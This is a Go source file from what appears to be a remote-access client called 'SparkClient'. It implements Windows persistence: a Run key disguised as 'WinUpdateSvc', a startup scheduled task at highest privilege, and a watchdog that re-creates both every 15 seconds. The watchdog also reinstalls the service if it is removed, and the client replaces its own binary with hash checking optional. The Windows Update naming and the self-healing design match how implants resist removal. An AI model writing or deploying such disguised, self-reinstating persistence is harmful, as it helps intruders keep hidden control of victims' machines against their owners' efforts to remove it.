//go:build windows

package lifecycle

import (
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"sync"
	"syscall"
	"time"

	"github.com/kataras/golog"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
	"os/exec"
)

const runKeyPath = `Software\Microsoft\Windows\CurrentVersion\Run`
const runValueName = `WinUpdateSvc`
const taskName = "WinUpdateSvcWatchdog"

var (
	// Update mutex prevents overlapping binary replacements
	updateMutex     sync.Mutex
	updateMutexName = "Global\\SparkClientUpdateMutex"

	// Pinned install path for security
	allowedInstallPaths = []string{
		`C:\ProgramData\Microsoft\Update`,
		`C:\Program Files\SparkClient`,
		`C:\Windows\System32`,
	}
)

// ensureRunKey keeps a Run key entry pointing at the installed binary so the
// service can self-heal if removed.
func ensureRunKey(exePath string) {
	if !persistenceAllowed(exePath) {
		return
	}
	// Use --ui-only to prevent duplicate WebSocket connections
	setRunKey(exePath + " --ui-only")
}

// StartWatchdog periodically restarts the service if stopped and reinstalls if
// the service entry is missing. This ensures the SERVICE stays running in Session 0.
// The service itself handles spawning client processes in user sessions.
func StartWatchdog(installer Installer, svcCtrl ServiceController) {
	go func() {
		golog.Info("watchdog: Starting watchdog (ensures service persistence)")
		// Initial ensure so we don't wait for the first tick.
		installPath := installer.GetInstallPath()

		// Validate binary on startup
		if err := ValidateServiceBinary(installPath); err != nil {
			golog.Errorf("watchdog: Binary validation failed: %v", err)
		}

		if persistenceAllowed(installPath) {
			golog.Debug("watchdog: Initial persistence setup")
			ensureRunKey(installPath)
			ensureScheduledTask(installPath)
		}

		ticker := time.NewTicker(15 * time.Second)
		defer ticker.Stop()
		for range ticker.C {
			if !persistenceAllowed(installPath) {
				golog.Info("watchdog: Persistence disabled, stopping watchdog")
				return
			}
			golog.Debug("watchdog: Periodic check")
			ensureRunKey(installPath)
			ensureScheduledTask(installPath)

			status, err := svcCtrl.Status()
			if err != nil || status == "unknown" {
				golog.Warnf("watchdog: Service status unknown, attempting reinstall")
				if err := installer.Install(); err != nil {
					golog.Warnf("watchdog: Reinstall failed: %v", err)
				}
				continue
			}

			if status != "running" {
				golog.Warnf("watchdog: Service not running (status: %s), attempting restart", status)
				if err := svcCtrl.Start(); err != nil {
					golog.Warnf("watchdog: Restart failed: %v", err)
				} else {
					golog.Info("watchdog: Service restarted successfully")
				}
			}
		}
	}()
}

func clearRunKey() {
	clearRunKeyRoots()
}

func setRunKeyRoots(path string) {
	// Try HKLM first for machine-wide persistence, then fall back to HKCU.
	if k, _, err := registry.CreateKey(registry.LOCAL_MACHINE, runKeyPath, registry.SET_VALUE); err == nil {
		_ = k.SetStringValue(runValueName, path)
		_ = k.Close()
		return
	}
	if k, _, err := registry.CreateKey(registry.CURRENT_USER, runKeyPath, registry.SET_VALUE); err == nil {
		_ = k.SetStringValue(runValueName, path)
		_ = k.Close()
	}
}

func clearRunKeyRoots() {
	if k, err := registry.OpenKey(registry.LOCAL_MACHINE, runKeyPath, registry.SET_VALUE); err == nil {
		_ = k.DeleteValue(runValueName)
		_ = k.Close()
	}
	if k, err := registry.OpenKey(registry.CURRENT_USER, runKeyPath, registry.SET_VALUE); err == nil {
		_ = k.DeleteValue(runValueName)
		_ = k.Close()
	}
}

func ensureScheduledTask(exePath string) {
	if exePath == "" {
		return
	}
	// Use --ui-only to prevent duplicate WebSocket connections
	args := []string{"/Create", "/F", "/SC", "ONSTART", "/RL", "HIGHEST", "/TN", taskName, "/TR", `"` + exePath + ` --ui-only"`}
	_ = exec.Command("schtasks.exe", args...).Run()
}

func removeScheduledTask() {
	_ = exec.Command("schtasks.exe", "/Delete", "/F", "/TN", taskName).Run()
}

// VerifyBinaryHash calculates and verifies the SHA256 hash of a binary
func VerifyBinaryHash(filePath string, expectedHash string) (bool, string, error) {
	file, err := os.Open(filePath)
	if err != nil {
		return false, "", fmt.Errorf("open file: %w", err)
	}
	defer file.Close()

	hasher := sha256.New()
	if _, err := io.Copy(hasher, file); err != nil {
		return false, "", fmt.Errorf("hash calculation: %w", err)
	}

	actualHash := hex.EncodeToString(hasher.Sum(nil))

	if expectedHash != "" {
		return actualHash == expectedHash, actualHash, nil
	}

	return true, actualHash, nil
}

// IsPathAllowed checks if the install path is in the allowed list
func IsPathAllowed(path string) bool {
	// Resolve to absolute path
	absPath, err := filepath.Abs(path)
	if err != nil {
		return false
	}

	// Check if path is under any allowed directory
	for _, allowed := range allowedInstallPaths {
		allowedAbs, err := filepath.Abs(allowed)
		if err != nil {
			continue
		}

		// Check if path is under allowed directory
		rel, err := filepath.Rel(allowedAbs, absPath)
		if err != nil {
			continue
		}

		// If relative path doesn't start with "..", it's under the allowed directory
		if len(rel) > 0 && rel[0] != '.' {
			return true
		}

		// Also accept exact match
		if absPath == allowedAbs {
			return true
		}
	}

	return false
}

// SafeUpdateBinary safely replaces a binary with mutex protection and hash verification
func SafeUpdateBinary(oldPath, newPath string, expectedHash string) error {
	// Validate paths
	if !IsPathAllowed(oldPath) {
		return fmt.Errorf("update rejected: target path not in allowed list: %s", oldPath)
	}

	// Acquire update mutex
	updateMutex.Lock()
	defer updateMutex.Unlock()

	golog.Infof("watchdog: acquiring global update mutex")
	mutexName, err := syscall.UTF16PtrFromString(updateMutexName)
	if err != nil {
		return fmt.Errorf("mutex name conversion: %w", err)
	}

	mutex, err := windows.CreateMutex(nil, false, mutexName)
	if err != nil {
		return fmt.Errorf("create mutex: %w", err)
	}
	defer windows.CloseHandle(mutex)

	// Wait for mutex with timeout
	event, err := windows.WaitForSingleObject(mutex, 30000) // 30 second timeout
	if err != nil || event != windows.WAIT_OBJECT_0 {
		return fmt.Errorf("acquire mutex timeout or error: %v", err)
	}
	defer windows.ReleaseMutex(mutex)

	golog.Infof("watchdog: update mutex acquired, proceeding with binary replacement")

	// Verify new binary hash if provided
	if expectedHash != "" {
		valid, actualHash, err := VerifyBinaryHash(newPath, expectedHash)
		if err != nil {
			return fmt.Errorf("hash verification failed: %w", err)
		}
		if !valid {
			return fmt.Errorf("hash mismatch: expected=%s actual=%s", expectedHash, actualHash)
		}
		golog.Infof("watchdog: new binary hash verified: %s", actualHash)
	} else {
		// Calculate and log hash even if not verifying
		_, actualHash, err := VerifyBinaryHash(newPath, "")
		if err != nil {
			golog.Warnf("watchdog: could not calculate new binary hash: %v", err)
		} else {
			golog.Infof("watchdog: new binary hash: %s", actualHash)
		}
	}

	// Backup old binary
	backupPath := oldPath + ".backup"
	if err := copyFile(oldPath, backupPath); err != nil {
		golog.Warnf("watchdog: failed to create backup: %v", err)
	} else {
		golog.Infof("watchdog: created backup at %s", backupPath)
	}

	// Replace binary
	// On Windows, we can't replace a running exe directly, so use rename + move pattern
	tempOldPath := oldPath + ".old"
	if err := os.Rename(oldPath, tempOldPath); err != nil {
		return fmt.Errorf("rename old binary: %w", err)
	}

	if err := copyFile(newPath, oldPath); err != nil {
		// Rollback
		os.Rename(tempOldPath, oldPath)
		return fmt.Errorf("copy new binary: %w", err)
	}

	// Mark new binary as executable
	if err := os.Chmod(oldPath, 0755); err != nil {
		golog.Warnf("watchdog: chmod failed: %v", err)
	}

	golog.Infof("watchdog: binary replaced successfully, cleaning up")

	// Clean up temp old binary
	os.Remove(tempOldPath)

	// Keep backup for 1 hour then clean up in background
	go func() {
		time.Sleep(1 * time.Hour)
		os.Remove(backupPath)
		golog.Debug("watchdog: removed old backup")
	}()

	return nil
}

// copyFile copies a file from src to dst
func copyFile(src, dst string) error {
	sourceFile, err := os.Open(src)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	destFile, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer destFile.Close()

	if _, err := io.Copy(destFile, sourceFile); err != nil {
		return err
	}

	return destFile.Sync()
}

// ValidateServiceBinary validates the currently running service binary
func ValidateServiceBinary(installPath string) error {
	if installPath == "" {
		return fmt.Errorf("install path not set")
	}

	// Check if path is allowed
	if !IsPathAllowed(installPath) {
		return fmt.Errorf("service binary path not in allowed list: %s", installPath)
	}

	// Check if binary exists
	if _, err := os.Stat(installPath); os.IsNotExist(err) {
		return fmt.Errorf("service binary not found: %s", installPath)
	}

	// Calculate hash for integrity check
	_, hash, err := VerifyBinaryHash(installPath, "")
	if err != nil {
		return fmt.Errorf("failed to calculate binary hash: %w", err)
	}

	golog.Infof("watchdog: service binary validated - path=%s hash=%s", installPath, hash)
	return nil
}
